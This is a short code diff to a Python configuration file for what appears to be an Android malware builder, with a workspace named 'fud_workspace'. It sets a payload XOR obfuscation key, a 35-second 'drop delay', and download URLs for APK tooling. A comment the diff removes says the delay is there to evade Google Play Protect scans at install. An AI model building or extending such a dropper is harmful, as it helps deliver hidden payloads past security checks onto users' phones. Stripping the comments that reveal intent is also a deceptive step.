@@ -24,7 +24,6 @@ WORK_DIR = os.path.join(_HOME, "fud_workspace")
 
 ANDROID_JAR = os.path.join(TOOLS_DIR, "android.jar")
 
-# Payload build-time obfuscation
 PAYLOAD_XOR_KEY = bytes([
     0xF1, 0x79, 0x78, 0x72, 0xAC, 0x69, 0x3E, 0xAA,
     0xB1, 0xA6, 0x4F, 0xB7, 0xF2, 0xC6, 0x30, 0x02,
@@ -32,10 +31,9 @@ PAYLOAD_XOR_KEY = bytes([
     0x2C, 0x48, 0x9E, 0x11, 0x73, 0xFA, 0x05, 0xB8,
 ])
 
-# Drop delay (ms) after launch — Play Protect scans at install, so delay = safer
 DROP_DELAY_MS = 35000
 
-URL_JRE         = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.11%2B9/OpenJDK17U-jdk_x64_linux_hotspot_17.0.11_9.tar.gz"
-URL_APKTOOL     = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
-URL_BUILDTOOLS  = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
-URL_ANDROID_JAR = "https://repo1.maven.org/maven2/com/google/android/android/4.1.1.4/android-4.1.1.4.jar"
+URL_JRE              = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.11%2B9/OpenJDK17U-jdk_x64_linux_hotspot_17.0.11_9.tar.gz"
+URL_APKTOOL          = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
+URL_BUILDTOOLS       = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
+URL_ANDROID_PLATFORM = "https://dl.google.com/android/repository/platform-34-ext7_r03.zip"
